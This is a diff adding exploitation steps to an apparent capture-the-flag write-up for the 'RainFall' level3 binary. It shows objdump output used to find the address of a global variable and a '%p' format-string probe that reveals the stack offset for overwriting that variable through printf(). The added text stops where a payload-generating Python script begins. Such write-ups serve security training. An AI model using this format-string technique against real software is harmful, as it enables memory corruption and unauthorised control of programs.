@@ -18,7 +18,36 @@ Relevant code:
 
 ## Exploitation
 
+To get the address of the variable `m` we use `objdump` :
+
+```
+level3@RainFall:~$ objdump -t ./level3 | grep m
+./level3:     file format elf32-i386
+080481b8 l    d  .dynsym    00000000              .dynsym
+08048618 l    d  .eh_frame_hdr    00000000              .eh_frame_hdr
+08048654 l    d  .eh_frame    00000000              .eh_frame
+0804974c l    d  .dynamic    00000000              .dynamic
+00000000 l    d  .comment    00000000              .comment
+08049884 l     O .bss    00000001              completed.6159
+08048480 l     F .text    00000000              frame_dummy
+08048734 l     O .eh_frame    00000000              __FRAME_END__
+0804974c l     O .dynamic    00000000              _DYNAMIC
+00000000       F *UND*    00000000              system@@GLIBC_2.0
+00000000  w      *UND*    00000000              __gmon_start__
+00000000       F *UND*    00000000              __libc_start_main@@GLIBC_2.0
+0804988c g     O .bss    00000004              m
+0804851a g     F .text    0000000d              main
+```
+
 We use a format string payload to write 0x40 into the global variable `m`.
+
+And then we just need the offset to build our payload and exploit `printf()`.
+
+```
+level3@RainFall:~$ ./level3 
+AAAA.%p.%p.%p.%p.%p.%p.%p.%p
+AAAA.0x200.0xb7fd1ac0.0xb7ff37d0.0x41414141.0x2e70252e.0x252e7025.0x70252e70.0x2e70252e
+```
 
 Python script to generate the payload:
 ```python
